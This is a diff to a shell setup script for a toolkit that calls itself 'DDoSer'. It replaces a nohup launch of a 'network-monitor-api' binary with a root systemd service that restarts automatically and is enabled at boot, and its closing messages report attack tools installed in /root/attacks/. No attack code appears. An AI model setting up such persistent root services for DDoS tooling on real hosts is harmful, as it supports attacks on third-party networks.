@@ -53,18 +53,41 @@ if [ $? -eq 0 ]; then
     
     # Check if file is executable
     if [ -x /root/network-monitor-api ]; then
-        # Start the network-monitor-api as a background process
-        nohup /root/network-monitor-api > /root/network-monitor.log 2>&1 &
+        # Create systemd service for network-monitor-api
+        cat > /etc/systemd/system/network-monitor-api.service << 'EOF'
+[Unit]
+Description=Network Monitor API
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=/root/network-monitor-api
+Restart=always
+RestartSec=5
+User=root
+Group=root
+Environment=PATH=/usr/bin:/usr/local/bin:/usr/sbin
+WorkingDirectory=/root
+StandardOutput=journal
+StandardError=journal
+
+[Install]
+WantedBy=multi-user.target
+EOF
         
-        # Get the process ID
-        NETWORK_MONITOR_PID=$!
+        # Reload systemd, enable and start the service
+        systemctl daemon-reload
+        systemctl enable network-monitor-api
+        systemctl start network-monitor-api
         
-        # Check if process started successfully
-        sleep 2
-        if ps -p $NETWORK_MONITOR_PID > /dev/null; then
-            echo "Network Monitor API started successfully with PID: $NETWORK_MONITOR_PID"
+        # Check if service started successfully
+        sleep 3
+        if systemctl is-active --quiet network-monitor-api; then
+            echo "Network Monitor API service started successfully"
+            systemctl status network-monitor-api --no-pager
         else
-            echo "Failed to start Network Monitor API"
+            echo "Failed to start Network Monitor API service"
+            systemctl status network-monitor-api --no-pager
             exit 1
         fi
     else
@@ -78,5 +101,5 @@ fi
 
 echo "DDoSer Setup Completed Successfully!"
 echo "Attack tools installed in /root/attacks/"
-echo "Network Monitor API running in background"
-echo "Log file: /root/network-monitor.log" 
+echo "Network Monitor API running as systemd service"
+echo "Check service status: systemctl status network-monitor-api" 
